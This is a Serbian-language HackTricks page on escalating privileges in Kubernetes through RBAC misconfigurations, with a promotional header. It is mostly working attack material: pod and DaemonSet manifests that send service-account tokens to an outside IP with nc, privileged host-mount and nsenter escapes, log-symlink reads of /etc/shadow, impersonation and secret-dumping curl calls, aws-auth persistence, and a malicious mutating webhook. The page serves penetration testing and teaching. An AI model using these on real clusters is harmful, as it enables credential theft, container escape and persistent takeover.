# Zloupotreba Uloga/ClusterRoles u Kubernetesu

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodi캜u PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ovde mo쬰te prona캖i neke potencijalno opasne konfiguracije Uloga i ClusterRoles.\
Zapamtite da mo쬰te dobiti sve podr쬬ne resurse sa `kubectl api-resources`

## **Pove캖anje Privilegija**

Pod pove캖anjem privilegija se podrazumeva ve코tina dobijanja **pristupa drugom principalu** unutar klastera **sa razli캜itim privilegijama** (unutar kubernetes klastera ili ka eksternim oblakama) od onih koje ve캖 imate, u Kubernetesu postoje uglavnom **4 glavne tehnike za pove캖anje privilegija**:

* Biti u mogu캖nosti da **se predstavite** kao drugi korisnik/grupe/SA sa ve캖im privilegijama unutar kubernetes klastera ili ka eksternim oblakama
* Biti u mogu캖nosti da **kreirate/izmenite/izvr코ite podove** gde mo쬰te **prona캖i ili povezati SA** sa ve캖im privilegijama unutar kubernetes klastera ili ka eksternim oblakama
* Biti u mogu캖nosti da **캜itate tajne** jer se tokeni SA 캜uvaju kao tajne
* Biti u mogu캖nosti da **pobegnete na 캜vor** iz kontejnera, gde mo쬰te ukrasti sve tajne kontejnera koji se izvr코avaju na 캜voru, akreditacije 캜vora i dozvole 캜vora unutar oblaka u kojem se izvr코ava (ako postoje)
* Peta tehnika koja zaslu쬿je pomen je mogu캖nost **pokretanja port-forward** u podu, jer mo쬯a mo쬰te pristupiti zanimljivim resursima unutar tog poda.

### Pristup Bilo Kom Resursu ili Glagolu (Zvezdica)

**Zvezdica (\*) daje dozvolu nad bilo kojim resursom sa bilo kojim glagolom**. Koristi je admini. Unutar ClusterRole to zna캜i da napada캜 mo쬰 zloupotrebiti bilo koju prostoriju u klasteru
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pristupite bilo kom resursu sa odre캠enim glagolom

U RBAC-u, odre캠ene dozvole predstavljaju zna캜ajne rizike:

1. **`create`:** Omogu캖ava kreiranje bilo kog resursa u klasteru, rizikuju캖i eskalaciju privilegija.
2. **`list`:** Dozvoljava listanje svih resursa, potencijalno otkrivaju캖i osetljive podatke.
3. **`get`:** Dozvoljava pristupanje tajnama iz servisnih naloga, predstavljaju캖i sigurnosnu pretnju.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Kreiranje Poda - Kra캠a Tokena

Napada캜 sa dozvolama za kreiranje poda, mo쬰 pridru쬴ti privilegovan Service Account u pod i ukrasti token kako bi se predstavio kao Service Account. Efikasno pove캖avaju캖i privilegije na njega.

Primer poda koji 캖e ukrasti token Service Account-a `bootstrap-signer` i poslati ga napada캜u:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Kreiranje i Begunstvo Kontejnera

Slede캖e ozna캜ava sve privilegije koje kontejner mo쬰 imati:

* **Privilegovan pristup** (onemogu캖avanje za코tite i postavljanje sposobnosti)
* **Onemogu캖avanje hostIPC i hostPid** namespace-ova koji mogu pomo캖i u eskalaciji privilegija
* **Onemogu캖avanje hostNetwork** namespace-a, omogu캖avaju캖i pristup kra캠i privilegija oblaka i bolji pristup mre쬬ma
* **Montiranje / unutar kontejnera** doma캖ina

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Kreirajte pod sa:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jednolinijski komentar sa [ovog tvita](https://twitter.com/mauilion/status/1129468485480751104) i sa nekim dodacima:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
### Skriveno

Verovatno 쬰lite da budete **neprimetni**, na slede캖im stranicama mo쬰te videti na 코ta biste mogli da pristupite ako kreirate pod omogu캖avaju캖i samo neka od pomenutih ovla코캖enja u prethodnom predlo코ku:

- **Privilegovano + hostPID**
- **Samo privilegovano**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Mo쬰te prona캖i primer kako kreirati/zloupotrebiti prethodne privilegovane konfiguracije podova na_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Kreiranje Poda - Preme코tanje u oblak

Ako mo쬰te **kreirati** pod (i opciono **servisni nalog**), mo쬯a 캖ete mo캖i da **dobijete privilegije u oblaku** dodeljivanjem **oblac팳kih uloga podu ili servisnom nalogu** i zatim pristupanjem tome.\
맚avi코e, ako mo쬰te kreirati **pod sa mre쬹im imenikom doma캖ina**, mo쬰te **ukrasti IAM** ulogu **캜vora**.

Za vi코e informacija pogledajte:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Kreiranje/Patchovanje Deploymenta, Daemonseta, Statefulseta, Replicationcontrollera, Replicasetova, Jobova i Cronjobova**

Mogu캖e je zloupotrebiti ova ovla코캖enja da biste **kreirali novi pod** i stekli privilegije kao u prethodnom primeru.

Slede캖i yaml **kreira daemonset i eksfiltrira token servisnog naloga unutar poda**:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Izvr코avanje u Podovima**

**`pods/exec`** je resurs u kubernetesu koji se koristi za **izvr코avanje komandi u ljusci unutar poda**. Ovo omogu캖ava da se **izvr코e komande unutar kontejnera ili da se dobije ljuska unutar**.

Stoga je mogu캖e **u캖i u pod i ukrasti token SA**, ili u캖i u privilegovan pod, pobegnuti na 캜vor, i ukrasti sve tokene podova na 캜voru i (zlo)upotrebiti 캜vor:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ova dozvola omogu캖ava **prosle캠ivanje jednog lokalnog porta na jedan port u odre캠enom podu**. Ovo je namenjeno kako bi se omogu캖ilo lako otklanjanje gre코aka aplikacija koje se izvr코avaju unutar poda, ali napada캜 mo쬰 zloupotrebiti ovu dozvolu kako bi pristupio zanimljivim (kao 코to su baze podataka) ili ranjivim aplikacijama (veb?) unutar poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hostovi sa mogu캖no코캖u pisanja /var/log/ bekstvo

Kako je [**nazna캜eno u ovom istra쬴vanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ako mo쬰te pristupiti ili kreirati pod sa **hosts `/var/log/` direktorijumom montiranim** na njega, mo쬰te **pobegnuti iz kontejnera**.\
Ovo je uglavnom zato 코to kada **Kube-API poku코a da dobije logove** kontejnera (koriste캖i `kubectl logs <pod>`), on **zahteva `0.log`** fajl poda koriste캖i `/logs/` endpoint **Kubelet** servisa.\
Kubelet servis izla쬰 `/logs/` endpoint koji zapravo **izla쬰 `/var/log` fajlsistem kontejnera**.

Stoga, napada캜 sa **pristupom pisanju u /var/log/ folder** kontejnera mo쬰 zloupotrebiti ovo pona코anje na 2 na캜ina:

* Modifikuju캖i `0.log` fajl svog kontejnera (obi캜no sme코ten u `/var/logs/pods/namespace_pod_uid/container/0.log`) da bude **simboli캜ka veza koja pokazuje na `/etc/shadow`** na primer. Zatim, mo캖i 캖ete da eksfiltrirate hosts shadow fajl koriste캖i:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ako napada캜 kontroli코e bilo koji princip sa **dozvolama za 캜itanje `nodes/log`**, mo쬰 jednostavno kreirati **simboli캜ku vezu** u `/host-mounted/var/log/sym` ka `/`, i kada **pristupi `https://<gateway>:10250/logs/sym/` prikaza캖e sadr쬬j korenskog fajl sistema hosta** (menjanje simboli캜ke veze mo쬰 omogu캖iti pristup fajlovima).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorija i automatski eksploit mogu se prona캖i na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Zaobilazak za코tite samo za 캜itanje <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ako imate sre캖e i visoko privilegovani kapacitet `CAP_SYS_ADMIN` je dostupan, mo쬰te jednostavno ponovo montirati fasciklu kao rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Zaobilazak hostPath za코tite u re쬴mu samo za 캜itanje <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kako je navedeno u [**ovom istra쬴vanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), mogu캖e je zaobi캖i za코titu:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
맚o je trebalo da spre캜i bekstva poput prethodnih, umesto kori코캖enja hostPath monta쬰, koristi PersistentVolume i PersistentVolumeClaim da montira hosts folder u kontejneru sa pisanjem pristupa:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Imitiranje privilegovanih naloga**

Sa privilegijom [**imitiranja korisnika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), napada캜 bi mogao da imitira privilegovani nalog.

Jednostavno koristite parametar `--as=<korisni캜koime>` u `kubectl` komandi da imitirate korisnika, ili `--as-group=<grupa>` da imitirate grupu:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ili koristite REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lista Tajni

Dozvola za **listanje tajni mo쬰 omogu캖iti napada캜u da zapravo pro캜ita tajne** pristupaju캖i REST API endpointu:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### 캛itanje tajne - grubo forsiranje token ID-eva

Iako napada캜 koji poseduje token sa dozvolama za 캜itanje zahteva ta캜no ime tajne da bi je koristio, za razliku od 코ire privilegije _**listanje tajni**_, i dalje postoje ranjivosti. Podrazumevani servisni nalozi u sistemu mogu biti nabrojani, svaki povezan sa tajnom. Ove tajne imaju strukturu imena: stati캜ki prefiks pra캖en slu캜ajnim alfanumeri캜kim tokenom od pet karaktera (isklju캜uju캖i odre캠ene karaktere) prema [izvornom kodu](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token se generi코e iz ograni캜enog skupa od 27 karaktera (`bcdfghjklmnpqrstvwxz2456789`), umesto punog alfanumeri캜kog opsega. Ovo ograni캜enje smanjuje ukupan mogu캖i broj kombinacija na 14.348.907 (27^5). Stoga, napada캜 bi mogao izvoditi grubo forsiranje napada kako bi dedukovao token u pitanju u roku od nekoliko sati, 코to potencijalno mo쬰 dovesti do eskalacije privilegija pristupom osetljivim servisnim nalozima.

### Zahtevi za potpisivanje sertifikata

Ako imate glagole **`create`** u resursu `certificatesigningrequests` (ili bar u `certificatesigningrequests/nodeClient`). Mo쬰te **kreirati** novi CeSR za **novi 캜vor**.

Prema [dokumentaciji, mogu캖e je automatski odobriti ove zahteve](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), tako da u tom slu캜aju **ne trebate dodatne dozvole**. U suprotnom, morali biste biti u mogu캖nosti da odobrite zahtev, 코to podrazumeva a쬿riranje u `certificatesigningrequests/approval` i `approve` u `signers` sa resursnim imenom `<signerNameDomain>/<signerNamePath>` ili `<signerNameDomain>/*`

**Primer uloge** sa svim potrebnim dozvolama je:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Dakle, sa odobrenim novim CSR-om 캜vora, mo쬰te **zloupotrebiti** posebne dozvole 캜vorova da biste **ukrali tajne** i **doveli do eskalacije privilegija**.

U [**ovom postu**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**ovom**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) konfiguracija GKE K8s TLS Bootstrap-a je konfigurisana sa **automatskim potpisivanjem** i zloupotrebljena je za generisanje akreditiva novog K8s 캜vora, a zatim zloupotrebljena za eskalaciju privilegija kra캠om tajni.\
Ako **imate pomenute privilegije, mo쬰te uraditi istu stvar**. Imajte na umu da prvi primer zaobilazi gre코ku koja spre캜ava novi 캜vor da pristupi tajnama unutar kontejnera jer **캜vor mo쬰 pristupiti samo tajnama kontejnera koji su mu montirani.**

Na캜in zaobi캠avanja ovoga je jednostavno **kreiranje akreditiva 캜vora za ime 캜vora na kojem je montiran kontejner sa zanimljivim tajnama** (ali proverite kako to uraditi u prvom postu):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Principali koji mogu izmeniti **`configmaps`** u kube-system namespace-u na EKS (mora biti u AWS) klasterima mogu dobiti privilegije administratorskog klastera tako 코to 캖e prepisati **aws-auth** configmapu.\
Potrebni glagoli su **`update`** i **`patch`**, ili **`create`** ako configmap nije kreiran:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Mo쬰te koristiti **`aws-auth`** za **upornost** daju캖i pristup korisnicima iz **drugih naloga**.

Me캠utim, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne radi iz drugog naloga**. Ali zapravo `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` radi ako stavite ARN klastera umesto samo imena.\
Da biste omogu캖ili rad `kubectl`, samo se pobrinite da **konfiguri코ete** kubeconfig rtve i u aws exec argumente dodajte `--profile other_account_role` tako da 캖e kubectl koristiti profil drugog naloga za dobijanje tokena i kontaktiranje AWS-a.
{% endhint %}

### Eskalacija u GKE

Postoje **2 na캜ina dodeljivanja K8s dozvola GCP principima**. U svakom slu캜aju, princip tako캠e treba dozvolu **`container.clusters.get`** kako bi mogao prikupiti akreditive za pristup klasteru, ili 캖ete morati **generisati svoju kubectl konfiguracionu datoteku** (pratite slede캖i link).

{% hint style="warning" %}
Kada razgovarate sa K8s API endpointom, **GCP auth token 캖e biti poslat**. Zatim, GCP, putem K8s API endpointa, prvo 캖e **proveriti da li princip** (po e-po코ti) **ima bilo kakav pristup unutar klastera**, a zatim 캖e proveriti da li ima **bilo kakav pristup putem GCP IAM**.\
Ako je **bilo koji** od njih **istinit**, bi캖e **odgovoren**. Ako **nije**, bi캖e prikazana **gre코ka** koja sugeri코e da se daju **dozvole putem GCP IAM**.
{% endhint %}

Zatim, prvi metod je kori코캖enje **GCP IAM**, K8s dozvole imaju svoje **ekvivalentne GCP IAM dozvole**, i ako princip to ima, mo캖i 캖e da ih koristi.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi metod je **dodeljivanje K8s dozvola unutar klastera** identifikuju캖i korisnika po njegovoj **e-po코ti** (uklju캜eni su GCP servisni nalozi).

### Kreirajte token za servisne naloge

Principi koji mogu **kreirati TokenRequests** (`serviceaccounts/token`) Kada razgovaraju sa K8s API endpointom SAs (informacije sa [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Principi koji mogu **`a쬿rirati`** ili **`popraviti`** **`pods/ephemeralcontainers`** mogu dobiti **izvr코enje koda na drugim podovima**, i potencijalno **iza캖i** na svoj 캜vor dodavanjem ephemeralnog kontejnera sa privilegovanim securityContextom

### ValidatingWebhookConfigurations ili MutatingWebhookConfigurations

Principi sa bilo kojim glagolima `kreiraj`, `a쬿riraj` ili `popravi` nad `validatingwebhookconfigurations` ili `mutatingwebhookconfigurations` mo쬯a mogu **kreirati jednu takvu webhook konfiguraciju** kako bi mogli **eskivirati privilegije**.

Za [`mutatingwebhookconfigurations` primer pogledajte ovaj odeljak ovog posta](./#malicious-admission-controller).

### Eskalacija

Kao 코to mo쬰te pro캜itati u slede캖em odeljku: [**Ugra캠ena prevencija eskalacije privilegija**](./#built-in-privileged-escalation-prevention), princip ne mo쬰 a쬿rirati niti kreirati uloge ili clusterroles bez posedovanja tih novih dozvola. Osim ako ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`.**\
Tada mo쬰 a쬿rirati/kreirati nove uloge, clusterroles sa boljim dozvolama od onih koje ve캖 ima.

### 캛vorovi proxy

Principi sa pristupom **`nodes/proxy`** podresursu mogu **izvr코iti kod na podovima** putem Kubelet API-ja (prema [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Vi코e informacija o Kubelet autentifikaciji na ovoj stranici:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Imate primer kako dobiti [**RCE razgovaraju캖i ovla코캖eno sa Kubelet API-jem ovde**](../pentesting-kubernetes-services/#kubelet-rce).

### Brisanje podova + nepostavljivi 캜vorovi

Principi koji mogu **brisati podove** (`delete` glagol nad resursom `pods`), ili **izbaciti podove** (`kreiraj` glagol nad resursom `pods/eviction`), ili **promeniti status poda** (pristup `pods/status`) i mogu **u캜initi druge 캜vorove nepostavljivim** (pristup `nodes/status`) ili **brisati 캜vorove** (`delete` glagol nad resursom `nodes`) i imaju kontrolu nad podom, mogu **ukrasti podove sa drugih 캜vorova** tako da se **izvr코e** u **kompromitovanom** **캜voru** i napada캜 mo쬰 **ukrasti tokene** sa tih podova.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usluga (CVE-2020-8554)

Principali koji mogu **modifikovati** **`services/status`** mogu postaviti polje `status.loadBalancer.ingress.ip` kako bi iskoristili **neispravljeni CVE-2020-8554** i pokrenuli **MiTM napade na klaster**. Ve캖ina mitigacija za CVE-2020-8554 spre캜ava samo usluge sa spoljnim IP adresama (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status 캜vorova i podova

Principali sa dozvolama za **`update`** ili **`patch`** nad `nodes/status` ili `pods/status`, mogu modifikovati oznake kako bi uticali na ograni캜enja raspore캠ivanja.

## Ugra캠ena prevencija privilegovanog eskaliranja

Kubernetes ima [ugra캠eni mehanizam](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) za spre캜avanje privilegovanog eskaliranja.

Ovaj sistem osigurava da **korisnici ne mogu pove캖ati svoje privilegije modifikuju캖i uloge ili vezivanja uloga**. Sprovo캠enje ove pravile se de코ava na nivou API-ja, pru쬬ju캖i za코titu 캜ak i kada je RBAC autorizator neaktivan.

Pravilo propisuje da **korisnik mo쬰 samo kreirati ili a쬿rirati ulogu ako poseduje sve dozvole koje uloga obuhvata**. 맚avi코e, opseg korisnikovih postoje캖ih dozvola mora se poklapati sa onim 코to uloga poku코ava da kreira ili modifikuje: ili 코irom klastera za ClusterRoles ili ograni캜eno na isti namespace (ili 코irom klastera) za Roles.

{% hint style="warning" %}
Postoji izuzetak od prethodnog pravila. Ako principali ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`** mo쬰 pove캖ati privilegije uloga i clusterroles 캜ak i bez posedovanja dozvola.
{% endhint %}

### **Dobijanje & A쬿riranje RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**O캜igledno je da je ova tehnika funkcionisala ranije, ali prema mojim testovima vi코e ne radi iz istog razloga obja코njenog u prethodnom odeljku. Ne mo쬰te kreirati/modifikovati rolebinding kako biste sebi ili drugom SA dali privilegije ako ve캖 nemate te dozvole.**
{% endhint %}

Privilegija za kreiranje Rolebindings omogu캖ava korisniku da **vezuje uloge za servisni nalog**. Ova privilegija potencijalno mo쬰 dovesti do privilegovanog eskaliranja jer **omogu캖ava korisniku da ve쬰 administratorske privilegije za kompromitovani servisni nalog.**

## Ostali napadi

### Aplikacija za sporedni proxy

Podrazumevano, nema enkripcije u komunikaciji izme캠u podova. Me캠usobna autentikacija, dvosmerna, od poda do poda.

#### Kreirajte aplikaciju za sporedni proxy <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Kreirajte va코 .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Uredite svoj .yaml i dodajte nekomentarisane linije:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Pogledajte dnevnike proxy-ja:
```bash
kubectl logs app -C proxy
```
Vi코e informacija na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zlonamerni kontroler prijema

Kontroler prijema **interceptuje zahteve ka Kubernetes API serveru** pre trajnog 캜uvanja objekta, ali **nakon 코to je zahtev autentifikovan** **i autorizovan**.

Ako napada캜 na neki na캜in uspe da **ubaci kontroler prijema mutacija**, bi캖e u mogu캖nosti da **modifikuje ve캖 autentifikovane zahteve**. Time mo쬰 potencijalno da ostvari privilegije i 캜e코캖e da se trajno zadr쬴 u klasteru.

**Primer sa** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Proverite status da biste videli da li je spreman:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Zatim implementirajte novi pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kada vidite gre코ku `ErrImagePull`, proverite ime slike pomo캖u bilo kog od slede캖ih upita:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Kao 코to mo쬰te videti na gornjoj slici, poku코ali smo pokrenuti sliku `nginx`, ali krajnja izvr코ena slika je `rewanthtammana/malicious-image`. 맚a se upravo desilo!!?

#### Tehni캜ki detalji <a href="#heading-technicalities" id="heading-technicalities"></a>

Skripta `./deploy.sh` uspostavlja mutating webhook admission kontroler, koji modifikuje zahteve ka Kubernetes API-ju kako je navedeno u svojim konfiguracionim linijama, uti캜u캖i na posmatrane rezultate:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
## Najbolje prakse

### **Onemogu캖avanje automatskog montiranja tokena servisnog naloga**

